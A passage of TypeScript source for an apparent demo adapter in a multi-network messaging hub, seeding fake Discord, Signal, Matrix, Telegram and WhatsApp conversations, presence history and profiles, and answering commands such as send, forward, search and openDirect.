    return { conversation: nativeId, added, ...(invited.length ? { invited } : {}), ...(failed.length ? { failed } : {}), ...(this.network === 'telegram' ? { notes: ['Telegram made it a basic group'] } : {}) };
  }

  private hello() {
    // Discord's demo accounts forward natively, as the real adapter does; the others leave it to the hub.
    // Matrix has no bio, so its demo account cannot edit one.
    const caps: P.Capability[] = ['send', 'history', 'react', 'markRead', 'threads', 'edit', 'redact', 'sendMedia', 'openDirect', 'typing', 'about', 'configure', 'profile', ...(this.network === 'matrix' ? [] : (['editProfile'] as const)), 'resolve', 'join', 'connect', 'requests', ...(LISTED.has(this.network) ? (['relationships', 'disconnect'] as const) : [])];
    // Adding people to groups on Discord, Signal and Matrix; WhatsApp's adapter leaves it out on purpose
    // (docs/group-settings.md), and the demo Telegram has no group About of its own. Making groups everywhere but WhatsApp.
    const all: P.Capability[] = [
      ...caps,
      ...(this.network === 'discord' ? (['forward', 'members', 'walkMembers', 'listThreads'] as const) : []),
      ...(this.network === 'signal' ? SIGNAL_PEOPLE : []),
      ...(ADDS_MEMBERS.has(this.network) ? (['addMembers'] as const) : []),
      ...(MAKES_GROUPS.has(this.network) ? (['createGroup'] as const) : []),
      // The networks whose servers search (netsearch.ts).
      ...(this.network === 'discord' || this.network === 'matrix' ? (['search'] as const) : []),
      // Block, ignore, notes, presence, sessions, profile fields (demoself.ts).
      ...(this.network === 'discord' ? DEMO_SELF_CAPS : []),
      ...(this.network === 'discord' ? DEMO_SERVER_CAPS : []),
      ...(this.network === 'discord' ? DEMO_THREAD_CAPS : []),
    ];
    this.emit({ t: 'hello', network: this.network, version: 'demo', capabilities: all.filter((c) => !this.without.has(c)) });
  }

  start(emit: (ev: P.AdapterEvent) => void) {
    this.emit = emit;
    running.set(this.key, this);
    const epoch: number = JSON.parse(this.acc.config || '{}').epoch ?? Date.now();
    const marker = join(this.dir, 'seeded');
    const firstRun = !existsSync(marker);
    const ago = (min: number) => epoch - min * 60_000;
    this.ago = ago;

    this.hello();
    emit({ t: 'status', status: 'online', self: { ...this.self, isSelf: true } });
    const pool = POOLS[this.network] ?? M;
    for (const i of Object.values(pool)) if (i !== this.self && !(this.network === 'discord' && (i === D.zyan || i === D.zyn))) emit({ t: 'identity', identity: i });
    if (this.key === 'dmain') emit({ t: 'identity', identity: D.zyn });
    if (this.key === 'dalt') emit({ t: 'identity', identity: D.zyan });
    // Joining, adding and requests (docs/add.md): what it joined before, and the requests waiting.
    this.adds = new DemoAdd(this.key, this.network, this.self, this.dir, emit);
    this.adds.start(epoch);
    if (this.network === 'discord') {
      const mine = SPACES.filter((x) => x.acc.includes(this.key) && x.fact.kind === 'community').map((x) => x.fact.nativeId);
      this.selfDemo = new DemoSelf(this.network, this.self, this.dir, emit, mine, (who, blocked) => this.adds.relate(who, blocked ? 'blocked' : 'stranger'));
      this.selfDemo.start();
    }

    for (const s of SPACES) if (s.acc.includes(this.key)) emit({ t: 'space', space: s.fact });
    if (this.network === 'discord') this.startServers(epoch);
    // Members the client loaded anyway (passive), with Discord's counts: kept only with the adversarial members setting.
    if (this.key === 'dmain')
      emit({
        t: 'members',
        space: g.dither,
        source: 'seen',
        total: 1287,
        online: 214,
        members: [
          { who: D.alice.nativeId, nick: 'alice', roles: ['Contributor'], joinedAt: ago(400 * 24 * 60) },
          { who: D.ravi.nativeId, roles: ['Contributor'] },
          { who: D.quinn.nativeId, roles: [] },
          { who: D.ci.nativeId, roles: ['Bot'] },
          { who: D.zyan.nativeId, roles: ['Maintainer'] },
        ],
      });
    for (const c of CONVS) {
      if (!c.acc.includes(this.key)) continue;
      const msgs = c.msgs;
      const lastAt = msgs.length ? ago(Math.min(...msgs.map((m) => m[0]))) : undefined;
      emit({ t: 'conversation', conversation: { ...c.fact, lastMessageAt: lastAt } });
      const ids = msgs.map((_, i) => `${c.fact.nativeId}~${i}`);
      msgs.forEach(([min, author, body, o = {}], i) => {
        const unreadTail = c.unread ?? 0;
        const live = firstRun && i >= msgs.length - unreadTail && author !== this.self;
        emit({
          t: 'message',
          live,
          message: {
            nativeId: ids[i],
            conversation: c.fact.nativeId,
            author: author.nativeId,
            ts: ago(min),
            editedTs: o.edited ? ago(min) + 60_000 : undefined,
            kind: o.kind ?? (o.att?.length ? 'media' : 'text'),
            body,
            replyTo: o.reply !== undefined ? ids[o.reply] : undefined,
            threadRoot: o.thread,
            mentionsSelf: body.includes(`<@${this.self.nativeId}>`),
            attachments: o.att,
            ...(o.fwd ? { forward: o.fwd } : {}),
            reactions: o.react || o.fancy ? [...(o.fancy ?? []), ...Object.entries(o.react ?? {}).map(([key, who]) => ({ key, authors: who.map((w) => w.nativeId) }))] : undefined,
          },
        });
      });
      const readUpTo = msgs.length - (c.unread ?? 0) - 1;
      if (readUpTo >= 0) emit({ t: 'read', conversation: c.fact.nativeId, upToTs: ago(msgs[readUpTo][0]) });
    }
    if (firstRun) this.seedHistory(ago);
    if (firstRun) writeFileSync(marker, String(Date.now()));
    if (this.network === 'discord') this.startThreads();
    scheduleChatter();
  }

  /** Discord's threads, forums and group DMs (demothreads.ts): the forum's tags and the threads' facts, after the conversations. */
  private startThreads() {
    const self = this.self.nativeId;
    const mine = this.key === 'dmain';
    this.threadsDemo = new DemoThreads(
      {
        selfId: self,
        emit: (ev) => this.emit(ev),
        fact: (id) => this.findConv(id)?.fact ?? null,
        keep: (fact) => void this.made.set(fact.nativeId, { acc: [this.key], fact, msgs: [] }),
        moderator: (channel) => {
          const c = this.findConv(channel);
          const guild = c ? this.guildOf(c) : null;
          return !!guild && ADMIN_IN[this.key].includes(guild);
        },
        id: (k) => snow(`${this.key}-${k}-${Date.now()}-${this.made.size}`),
      },
      {
        forums: mine ? { [ch('rust-help')]: { tags: [{ id: snow('tag-solved'), name: 'Solved', emoji: '✅', moderated: true }, { id: snow('tag-async'), name: 'async' }, { id: snow('tag-cargo'), name: 'cargo' }], sort: 'activity', layout: 'list' } } : {},
        threads: mine
          ? {
              [T.rustHelpAsync]: { joined: true, owner: D.owl.nativeId, tags: [snow('tag-solved'), snow('tag-async')], createdAt: this.ago(7 * 60) },
              [T.rustHelpWs]: { joined: false, owner: D.bea.nativeId, tags: [snow('tag-cargo')], createdAt: this.ago(DAY + 300) },
              [T.ditherBoot]: { joined: true, notify: 'all', owner: self, createdAt: this.ago(2 * DAY) },
            }
          : {},
        archived: mine
          ? [
              {
                fact: { nativeId: snow('t-rust-old'), shape: 'thread', name: 'Is there a no_std HashMap?', parentConversation: ch('rust-help'), thread: { owner: D.hannah.nativeId, tags: [snow('tag-solved')], createdAt: this.ago(40 * DAY) } },
                first: { nativeId: snow('t-rust-old'), author: D.hannah.nativeId, ts: this.ago(40 * DAY), body: 'Looking for a HashMap that works without std. hashbrown?' },
              },
              {
                fact: { nativeId: snow('t-dither-secret'), shape: 'thread', name: 'release planning', parentConversation: ch('dither-dev'), thread: { owner: self, private: true, createdAt: this.ago(20 * DAY) } },
                first: { nativeId: snow('t-dither-secret-1'), author: self, ts: this.ago(20 * DAY), body: 'Dates for the next release, before we say them anywhere.' },
                mine: true,
              },
            ]
          : [],
        owns: mine ? [snow('gdm-raid')] : [],
      },
    );
    this.threadsDemo.announce();
  }

  /** Things that changed and things taken back, once, so history has something to show (docs/history.md). */
  /** A page back from the network's list, as Discord's `before`. */
  private history(cmd: Extract<P.AdapterCommand, { t: 'history' }>): P.HistoryResult {
    const c = this.findConv(cmd.conversation);
    if (!c || (this.network !== 'discord' && this.network !== 'matrix')) return { count: 0, done: true };
    const all = networkMessages(c, this.network, this.ago, this.self);
    const below = all.filter((m) => cmd.beforeTs === undefined || m.ts < cmd.beforeTs);
    const page = below.slice(-cmd.limit);
    for (const m of page) this.emit({ t: 'message', live: false, message: m });
    return { count: page.length, done: page.length === below.length, ...(page.length ? { oldest: page[0].ts } : {}) };
  }

  /** The network's search over what it holds, every word in the body, newest first, 25 at a time. */
  private search(cmd: Extract<P.AdapterCommand, { t: 'search' }>): P.NetworkSearchResult {
    const convs = CONVS.filter((c) => c.acc.includes(this.key) && c.fact.shape !== 'self').filter((c) => {
      if (cmd.scope.kind === 'all') return true;
      if (cmd.scope.kind === 'conversation') return c.fact.nativeId === cmd.scope.id;
      return this.guildOf(c) === cmd.scope.id;
    });
    const q = cmd.query;
    const words = q.text.toLowerCase().replace(/"/g, ' ').split(/\s+/).filter(Boolean);
    const hits = convs
      .filter((c) => !q.in?.length || q.in.includes(c.fact.nativeId))
      .flatMap((c) => networkMessages(c, this.network, this.ago, this.self))
      .filter((m) => words.every((w) => m.body.toLowerCase().includes(w)))
      .filter((m) => !q.authors?.length || q.authors.includes(m.author))
      .filter((m) => (q.after === undefined || m.ts >= q.after) && (q.before === undefined || m.ts < q.before))
      .sort((a, b) => (q.sort === 'oldest' ? a.ts - b.ts : b.ts - a.ts));
    const offset = cmd.offset ?? 0;
    const page = hits.slice(offset, offset + (cmd.limit ?? 25));
    for (const m of page) this.emit({ t: 'message', live: false, message: m });
    return { hits: page.map((m) => m.nativeId), total: hits.length, next: offset + page.length < hits.length ? offset + page.length : null };
  }

  /** A channel's threads, as Discord's thread search lists them: the demo's are all active, none archived. */
  private threads(cmd: Extract<P.AdapterCommand, { t: 'threads' }>): P.ThreadsResult {
    // Archived ones (and your private ones) from demothreads.ts, with their first messages.
    if (cmd.archived) {
      const ids = cmd.offset ? [] : (this.threadsDemo?.archived(cmd.conversation, cmd.mine === true) ?? []);
      return { count: ids.length, more: false, ids };
    }
    const found = CONVS.filter((c) => c.acc.includes(this.key) && c.fact.shape === 'thread' && c.fact.parentConversation === cmd.conversation);
    const page = found.slice(cmd.offset, cmd.offset + 25);
    for (const c of page) this.emit({ t: 'conversation', conversation: c.fact });
    return { count: page.length, more: cmd.offset + page.length < found.length, ids: page.map((c) => c.fact.nativeId) };
  }

  /** Members by name prefix, as Discord's member search answers it, or (`recent`) a page of the newest, as its op 35 does. */
  private walkMembers(cmd: Extract<P.AdapterCommand, { t: 'walkMembers' }>): P.WalkResult {
    const space = this.findSpace(cmd.space);
    if (!space) throw new Error('this demo account is not in that server');
    const everyone = [...WALKABLE, ...Object.values(D)];
    const q = cmd.query.toLowerCase();
    // The demo's newest page holds everyone, so a recent walk is one page.
    const found = cmd.recent
      ? cmd.after
        ? []
        : everyone.slice(0, cmd.limit)
      : everyone.filter((i) => !q || (i.displayName ?? '').toLowerCase().startsWith(q) || (i.handle ?? '').toLowerCase().startsWith(q)).slice(0, cmd.limit);
    for (const i of found) if (WALKABLE.includes(i)) this.emit({ t: 'identity', identity: i });
    this.emit({ t: 'members', space: cmd.space, source: 'walk', total: everyone.length, members: found.map((i) => ({ who: i.nativeId })) });
    return { count: found.length, total: everyone.length, ...(cmd.recent ? { next: found.length >= cmd.limit ? found[found.length - 1].nativeId : null } : {}) };
  }

  private seedHistory(ago: (min: number) => number) {
    if (this.key !== 'sig') return;
    const climb = CONVS.find((c) => c.fact.nativeId === sgroup('climb', '', []).nativeId)!.fact;
    const emit = this.emit;
    emit({ t: 'conversation', conversation: { ...climb, topic: 'Tuesdays at Mesa' } });
    emit({ t: 'conversation', conversation: { ...climb, topic: 'Tuesdays and Thursdays at Mesa. Bring your own chalk.' } });
    emit({ t: 'conversation', conversation: { ...climb, participants: [...climb.participants!, S.mei.nativeId] } });
    const msg = (nativeId: string, author: P.IdentityFact, min: number, body: string, x: Partial<P.MessageFact> = {}) =>
      emit({ t: 'message', live: false, message: { nativeId, conversation: climb.nativeId, author: author.nativeId, ts: ago(min), body, ...x } });
    msg(`${climb.nativeId}~h-edit`, S.priya, 70, 'meet at 6');
    msg(`${climb.nativeId}~h-edit`, S.priya, 70, 'meet at 6:30, traffic', { editedTs: ago(68) });
    msg(`${climb.nativeId}~h-del`, S.sam, 65, 'wrong chat lol, ignore this');
    emit({ t: 'delete', conversation: climb.nativeId, nativeId: `${climb.nativeId}~h-del` });
    msg(`${climb.nativeId}~h-gone`, S.alice, 60, 'door code for the gym is 4471');
    emit({ t: 'delete', conversation: climb.nativeId, nativeId: `${climb.nativeId}~h-gone`, reason: 'expired' });
    // A pin, a reaction taken back, a role, a status, and your message read.
    msg(`${climb.nativeId}~h-pin`, S.priya, 58, 'Mesa is open till 10 on Thursdays now');
    emit({ t: 'pin', conversation: climb.nativeId, message: `${climb.nativeId}~h-pin`, pinned: true, by: S.alice.nativeId, ts: ago(57) });
    emit({ t: 'reaction', conversation: climb.nativeId, message: `${climb.nativeId}~h-pin`, author: S.sam.nativeId, key: '😢' });
    emit({ t: 'reaction', conversation: climb.nativeId, message: `${climb.nativeId}~h-pin`, author: S.sam.nativeId, key: '😢', remove: true });
    emit({ t: 'role', target: { kind: 'conversation', nativeId: climb.nativeId }, member: S.sam.nativeId, role: 'Admin', given: true, by: S.priya.nativeId, ts: ago(56) });
    emit({ t: 'customStatus', who: S.alice.nativeId, text: 'out climbing', emoji: '🧗', ts: ago(200) });
    emit({ t: 'customStatus', who: S.alice.nativeId, text: 'on the wall, back at 8', emoji: '🧗', ts: ago(55) });
    // Presence as it changed, logged only with adversarial features and presence on.
    for (const [state, min, devices] of [['online', 240, ['desktop']], ['idle', 210, ['desktop']], ['offline', 180, []], ['online', 56, ['mobile']], ['dnd', 30, ['mobile', 'desktop']]] as const)
      emit({ t: 'presence', who: S.alice.nativeId, state, devices: [...devices], ts: ago(min) });
    msg(`${climb.nativeId}~h-mine`, S.self, 54, 'I can drive, leaving at 6');
    for (const [who, state, min] of [[S.alice, 'delivered', 53], [S.alice, 'read', 52], [S.priya, 'delivered', 53], [S.priya, 'read', 50]] as const)
      emit({ t: 'receipt', conversation: climb.nativeId, messages: [`${climb.nativeId}~h-mine`], who: who.nativeId, state, ts: ago(min) });
    this.seedActivity();
  }

  /**
   * Weeks of Sam writing in the evenings, with your replies and their reactions, and their presence and status over
   * those weeks (kept only with adversarial features), for a profile's Activity chart (docs/profile.md). All of it is
   * over a week old, so the inbox and the chats' newest messages stay as they were.
   */
  private seedActivity() {
    const emit = this.emit;
    const dm = sdm(S.sam).nativeId;
    let seed = 11;
    const rnd = () => (seed = (seed * 16807) % 2147483647) / 2147483647;
    const local = (daysAgo: number, hour: number, minute: number) => {
      const d = new Date();
      d.setDate(d.getDate() - daysAgo);
      d.setHours(hour, minute, 0, 0);
      return d.getTime();
    };
    const theirs = ['gym tonight?', 'that crimp is evil', 'my fingers are wrecked', 'did you try the new set?', 'ok one more session', 'sent it!!', 'rest day for me', 'see you at 7'];
    const yours = ['in', 'nice', 'maybe tomorrow', 'haha same', 'on my way'];
    let k = 0;
    for (let d = 45; d >= 9; d--) {
      if (rnd() < 0.3) continue;
      const n = 1 + Math.floor(rnd() * 6);
      for (let i = 0; i < n; i++) {
        const mine = rnd() < 0.35;
        const nativeId = `${dm}~a${k++}`;
        const body = mine ? yours[Math.floor(rnd() * yours.length)] : theirs[Math.floor(rnd() * theirs.length)];
        emit({ t: 'message', live: false, message: { nativeId, conversation: dm, author: (mine ? S.self : S.sam).nativeId, ts: local(d, 19 + Math.floor(rnd() * 6), Math.floor(rnd() * 60)), body } });
        if (mine && rnd() < 0.4) emit({ t: 'reaction', conversation: dm, message: nativeId, author: S.sam.nativeId, key: '👍' });
      }
    }
    // Presence each day of the last three weeks: on in the evening, idle or busy some days, off at night.
    for (let d = 21; d >= 2; d--) {
      if (d % 6 === 0) emit({ t: 'presence', who: S.sam.nativeId, state: 'dnd', devices: ['desktop'], ts: local(d, 9, 30) });
      if (d % 6 === 0) emit({ t: 'presence', who: S.sam.nativeId, state: 'offline', devices: [], ts: local(d, 12, 0) });
      emit({ t: 'presence', who: S.sam.nativeId, state: 'online', devices: ['mobile'], ts: local(d, 18, Math.floor(rnd() * 50)) });
      if (rnd() < 0.5) emit({ t: 'presence', who: S.sam.nativeId, state: 'idle', devices: ['mobile'], ts: local(d, 21, Math.floor(rnd() * 50)) });
      emit({ t: 'presence', who: S.sam.nativeId, state: 'offline', devices: [], ts: local(d, 23, 30 + Math.floor(rnd() * 25)) });
    }
    for (const [text, emoji, d] of [['projecting the cave route', '🧗', 25], ['rest week', '', 13], ['trip planning', '⛺', 5]] as const)
      emit({ t: 'customStatus', who: S.sam.nativeId, text, emoji: emoji || undefined, ts: local(d, 12, 0) });
  }

  /** What this adapter sent since it started, for forwarding it. */
  private sent = new Map<string, { body: string; att?: P.AttachmentFact[] }>();

  /** A message's content by native id: seeded ones by position, sent ones from memory. */
  private contentOf(nativeId: string): { body: string; att?: P.AttachmentFact[] } | null {
    const mine = this.sent.get(nativeId);
    if (mine) return mine;
    const at = nativeId.lastIndexOf('~');
    const conv = CONVS.find((c) => c.fact.nativeId === nativeId.slice(0, at) && c.acc.includes(this.key));
    const m = conv?.msgs[Number(nativeId.slice(at + 1))];
    return m ? { body: m[2], att: m[3]?.att } : null;
  }

  /** Conversations opened since this adapter started: conversation id -> the peer. */
  private opened = new Map<string, string>();

  /** The same answers real adapters give, with the Signal rule that nothing exists until the first send. */
  private openDirect(peer: string): P.OpenDirectResult {
    const signal = this.network === 'signal';
    // The request Discord filed as spam comes from someone who takes messages only from friends.
    if (this.network === 'discord' && peer === D.drops.nativeId) throw new Error('Discord will not deliver a message to them: they take direct messages only from friends.');
    if (this.network === 'whatsapp') return this.openWhatsApp(peer);
    const pool = Object.values(POOLS[this.network] ?? M);
    const known = pool.find((i) => i.nativeId === peer || i.handle === peer);
    if (signal && peer.startsWith('+') && !known && peer.endsWith('00')) throw new Error(`${peer} is not on Signal`);
    if (this.network === 'telegram' && peer.startsWith('@') && !known) throw new Error(`Nobody on Telegram is called ${peer}`);
    const nativeId = known?.nativeId ?? (signal && peer.startsWith('+') ? `d0000000-0000-4000-8000-${peer.slice(1).padStart(12, '0').slice(-12)}` : peer);
    const existing = CONVS.find((c) => c.acc.includes(this.key) && c.fact.shape === 'direct' && c.fact.participants?.includes(nativeId));
    if (existing) return { conversation: existing.fact.nativeId, existed: true, ...(signal ? { startsAtFirstSend: true } : {}) };
    const conversation = signal ? `dm:${this.self.nativeId}:${nativeId}` : this.network === 'matrix' ? `!direct-${nativeId.replace(/\W/g, '')}:demo` : this.network === 'telegram' ? `user:${nativeId}` : snow(`dm-${this.key}-${nativeId}`);
    const existed = this.opened.has(conversation);
    this.opened.set(conversation, nativeId);
    if (!known) this.emit({ t: 'identity', identity: { nativeId, handle: peer } });
    this.emit({ t: 'conversation', conversation: { nativeId: conversation, shape: 'direct', participants: [this.self.nativeId, nativeId], ...(signal ? { encrypted: true } : {}) } });
    return { conversation, existed, ...(signal ? { startsAtFirstSend: true } : {}) };
  }

  /** WhatsApp: a phone number or JID is the chat; nothing exists until the first send. */
  private openWhatsApp(peer: string): P.OpenDirectResult {
    const jid = peer.includes('@') ? peer : `${peer.replace(/\D/g, '')}@s.whatsapp.net`;
    if (jid.startsWith('1555000')) throw new Error(`${peer} is not on WhatsApp`);
    const existed = CONVS.some((c) => c.acc.includes(this.key) && c.fact.nativeId === jid) || this.opened.has(jid);
    if (!existed) {
      this.opened.set(jid, jid);
      if (!Object.values(W).some((i) => i.nativeId === jid)) this.emit({ t: 'identity', identity: { nativeId: jid, handle: `+${jid.split('@')[0]}` } });
      this.emit({ t: 'conversation', conversation: { nativeId: jid, shape: 'direct', participants: [this.self.nativeId, jid], encrypted: true } });
    }
    return { conversation: jid, existed, startsAtFirstSend: !existed };
  }

  /** Someone types for a few seconds, then says it. */
  typeThenSay(conversation: string, author: P.IdentityFact, body: string) {
    this.emit({ t: 'typing', conversation, author: author.nativeId });
    this.later(4000, () => this.say(conversation, author, body));
  }

  /** A live message from someone else. */
  say(conversation: string, author: P.IdentityFact, body: string) {
    this.emit({
      t: 'message',
      live: true,
      message: {
        nativeId: `${conversation}~live-${Date.now()}`,
        conversation,
        author: author.nativeId,
        ts: Date.now(),
        body,
        mentionsSelf: body.includes(`<@${this.self.nativeId}>`),
      },
    });
  }

  private later(ms: number, fn: () => void) {
    const t = setTimeout(() => {
      this.timers.delete(t);
      fn();
    }, ms);
    this.timers.add(t);
  }

  command(cmd: P.AdapterCommand) {
    const reply = (result?: unknown) => 'id' in cmd && this.emit({ t: 'reply', id: cmd.id, ok: true, result });
    const own = this.selfDemo?.command(cmd);
    if (own && 'id' in cmd) {
      if ('error' in own) this.emit({ t: 'reply', id: cmd.id, ok: false, error: own.error });
      else reply(own.result);
      return;
    }
    switch (cmd.t) {
      case 'send': {
        const nativeId = `${cmd.conversation}~sent-${Date.now()}`;
        // The file leaves the spool once this returns, and a demo has nowhere else to keep it.
        const attachments = cmd.attachments?.map((f) => ({ kind: f.kind, mime: f.mime, name: f.name, size: f.size, url: `data:${f.mime};base64,${readFileSync(f.path).toString('base64')}` }));
        this.emit({ t: 'message', live: true, message: { nativeId, conversation: cmd.conversation, author: this.self.nativeId, ts: Date.now(), body: cmd.body, replyTo: cmd.replyTo, kind: attachments?.length && !cmd.body ? 'media' : 'text', attachments } });
        this.sent.set(nativeId, { body: cmd.body, att: attachments });
        reply({ nativeId });
        const conv = CONVS.find((c) => c.fact.nativeId === cmd.conversation);
        const peer = this.opened.get(cmd.conversation);
        const others = peer ? [peer] : (conv?.fact.participants ?? []).filter((p) => p !== this.self.nativeId);
        if ((peer || conv?.fact.shape === 'direct') && others[0]) {
          const lines = REPLIES[others[0]] ?? ['👀', 'got it', 'nice'];
          const author = Object.values({ ...D, ...S, ...M }).find((i) => i.nativeId === others[0]) ?? { nativeId: others[0] };
          // They type first, the way an answer arrives on the real networks; their message ends it.
          this.later(1200, () => this.emit({ t: 'typing', conversation: cmd.conversation, author: author.nativeId }));
          this.later(3500 + Math.random() * 3000, () => this.say(cmd.conversation, author, lines[Math.floor(Math.random() * lines.length)]));
        } else if (others.length) {
          const who = others[Math.floor(Math.random() * others.length)];
          this.later(2500, () => this.emit({ t: 'reaction', conversation: cmd.conversation, message: nativeId, author: who, key: '👍' }));
          // A group stirs: a few people start typing, then think better of it.
          const typers = [...others].sort(() => Math.random() - 0.5).slice(0, Math.min(4, others.length));
          typers.forEach((who, i) => {
            this.later(900 + i * 500, () => this.emit({ t: 'typing', conversation: cmd.conversation, author: who }));
            this.later(6500 + i * 700, () => this.emit({ t: 'typing', conversation: cmd.conversation, author: who, stop: true }));
          });
        }
        break;
      }
      case 'forward': {
        const src = this.contentOf(cmd.source.message);
        if (!src) {
          reply({ fallback: 'this demo account does not have that message' });
          break;
        }
        const nativeId = `${cmd.conversation}~fwd-${Date.now()}`;
        const forward = { conversation: cmd.source.conversation, message: cmd.source.message };
        this.emit({ t: 'message', live: true, message: { nativeId, conversation: cmd.conversation, author: this.self.nativeId, ts: Date.now(), body: src.body, kind: src.att?.length && !src.body ? 'media' : 'text', attachments: src.att, forward } });
        if (cmd.note) this.emit({ t: 'message', live: true, message: { nativeId: `${nativeId}-note`, conversation: cmd.conversation, author: this.self.nativeId, ts: Date.now() + 1, body: cmd.note } });
        this.sent.set(nativeId, src);
        reply({ nativeId });
        break;
      }
      case 'resolve':
      case 'add':
      case 'answer':
      case 'remove':
        try {
          reply(this.adds.command(cmd));
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'openDirect':
        try {
          reply(this.openDirect(cmd.peer));
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'react':
        this.emit({ t: 'reaction', conversation: cmd.conversation, message: cmd.message, author: this.self.nativeId, key: cmd.key, remove: cmd.remove, style: cmd.style, ...(cmd.style === 'super' ? { colors: SUPER_COLORS } : {}), emoji: cmd.emoji });
        reply();
        break;
      case 'edit':
        this.emit({ t: 'message', live: false, message: { nativeId: cmd.message, conversation: cmd.conversation, author: this.self.nativeId, ts: 0, editedTs: Date.now(), body: cmd.body } });
        reply();
        break;
      case 'redact':
        this.emit({ t: 'delete', conversation: cmd.conversation, nativeId: cmd.message });
        reply();
        break;
      case 'reactionContext':
        reply(this.reactionContext());
        break;
      case 'profile':
        reply(this.selfDemo ? this.selfDemo.decorate(cmd.who, this.signalExtras(this.profile(cmd.who), cmd.who)) : this.signalExtras(this.profile(cmd.who), cmd.who));
        break;
      case 'verify':
        if (cmd.clear) DEMO_VERIFIED.delete(cmd.who);
        else if (cmd.safetyNumber?.replace(/\D/g, '') === demoSafety(cmd.who)) DEMO_VERIFIED.add(cmd.who);
        else {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: 'Their safety number changed since: look again' });
          break;
        }
        reply(this.signalExtras(this.profile(cmd.who), cmd.who));
        break;
      case 'block':
        reply({ blocked: !cmd.unblock });
        break;
      case 'setContact':
        reply({});
        break;
      case 'setProfile': {
        // As the real adapters do: the network's limit, then the About as a status on Signal and WhatsApp.
        const bio = cmd.change.bio;
        const { bio: _bio, ...more } = cmd.change;
        const refused = !Object.keys(more).length ? null : this.selfDemo ? this.selfDemo.profileChange(more) : 'only the bio can be set';
        if (refused) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: refused });
          break;
        }
        const limit = P_BIO_LIMIT[this.network];
        if (bio !== undefined && limit !== undefined && [...bio].length > limit) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: `bio is longer than ${limit} characters` });
          break;
        }
        if (bio !== undefined) {
          OWN_BIO.set(`${this.network}:${this.self.nativeId}`, bio);
          if (this.network === 'signal' || this.network === 'whatsapp') this.emit({ t: 'customStatus', who: this.self.nativeId, text: bio, ts: Date.now() });
        }
        if (this.network === 'signal' && cmd.change.username !== undefined) {
          if (cmd.change.username === null) DEMO_USERNAME.delete(this.self.nativeId);
          else DEMO_USERNAME.set(this.self.nativeId, { name: `${cmd.change.username}.42`, link: 'https://signal.me/#eu/DemoUsernameLink42' });
        }
        reply(this.selfDemo ? this.selfDemo.decorate(this.self.nativeId, this.signalExtras(this.profile(this.self.nativeId), this.self.nativeId)) : this.signalExtras(this.profile(this.self.nativeId), this.self.nativeId));
        break;
      }
      case 'followThread':
      case 'threadNotify':
      case 'threadState':
      case 'createThread':
      case 'createPost':
      case 'crosspost':
      case 'removeMember':
      case 'setOwner':
      case 'setPicture':
        try {
          const r = this.threadsDemo?.command(cmd, (target) => this.threadAbout(target, this.about(target)));
          if (!r) throw new Error(`${cmd.t} is not in this demo network`);
          reply(r.value);
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'leave':
        // A group DM or a DM (demothreads.ts); a server (demoservers.ts).
        if (cmd.target.kind === 'conversation') {
          try {
            const r = this.threadsDemo?.command(cmd, (target) => this.about(target));
            if (!r) throw new Error('Leaving this is not in this demo network');
            reply(r.value);
          } catch (e) {
            this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
          }
          break;
        }
      // falls through: a server
      case 'scheduledEvents':
      case 'rsvp':
      case 'gate':
      case 'answerGate':
      case 'setNick':
        try {
          const r = this.servers?.command(cmd);
          if (!r) throw new Error(`${cmd.t} is not in this demo network`);
          reply(cmd.t === 'setNick' ? this.serverAbout({ kind: 'space', nativeId: cmd.space }, this.about({ kind: 'space', nativeId: cmd.space })) : r.value);
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'about':
      case 'configure':
        try {
          reply(this.threadAbout(cmd.target, this.serverAbout(cmd.target, cmd.t === 'about' || this.servers?.configureInvite(cmd.target, cmd.change) ? this.about(cmd.target) : this.configure(cmd.target, cmd.change))));
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'createGroup':
        try {
          reply(this.createGroup(cmd.name, cmd.people));
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'addMembers':
        try {
          reply(this.addMembers(cmd.target, cmd.people));
        } catch (e) {
          this.emit({ t: 'reply', id: cmd.id, ok: false, error: (e as Error).message });
        }
        break;
      case 'reactors':
        reply({ authors: Object.values(D).filter((i) => i !== D.zyan && i !== D.zyn).slice(0, 5).map((i) => i.nativeId) });
        break;
      case 'history':
        reply(this.history(cmd));
        break;
      case 'search':
        reply(this.search(cmd));
        break;
      case 'walkMembers':
        reply(this.walkMembers(cmd));
        break;
      case 'threads':
        reply(this.threads(cmd));
        break;
      case 'markRead':
        this.readLog.push({ conversation: cmd.conversation, upTo: cmd.upTo, at: Date.now() });
        if (this.readLog.length > 200) this.readLog.shift();
        reply();
        break;
      case 'typing':
        // Kept for verify scripts (action typingLog): what the hub told this account to say about your typing.
        this.typingLog.push({ conversation: cmd.conversation, stop: !!cmd.stop, at: Date.now() });
        if (this.typingLog.length > 50) this.typingLog.shift();
        reply();
        break;
      case 'fetchMedia': {
        // Most demo media is inline (data:); a file under demo: goes through the hub's /media/ like a network's would.
        const f = DEMO_FILES[cmd.url];
        if (f) reply({ mime: f.mime, base64: Buffer.from(f.bytes).toString('base64') });
        else this.emit({ t: 'reply', id: cmd.id, ok: false, error: 'demo media is inline' });
        break;
      }
      case 'action':
        // say: a live message from someone else, for scripts/verify-perf.ts. Native ids of the conversation and author.
        if (cmd.action === 'say') {
          const a = cmd.args as { conversation: string; author: string; body: string };
          this.say(a.conversation, { nativeId: a.author }, a.body);
          reply({ ok: true });
          break;
        }
        // notice: a notice from the network on this account (demoself.ts), or none with args null.
        if (cmd.action === 'notice' && this.selfDemo) {
          this.selfDemo.notice((cmd.args as P.AccountNotice | null) ?? null);
          reply({ ok: true });
          break;
        }
        // capabilities: say hello again without these (scripts/verify-add.ts), or with everything when none are given.
        if (cmd.action === 'capabilities') {
          this.without = new Set(((cmd.args as { without?: P.Capability[] } | undefined)?.without ?? []).filter((c) => typeof c === 'string'));
          this.hello();
          reply({ ok: true });
          break;
        }
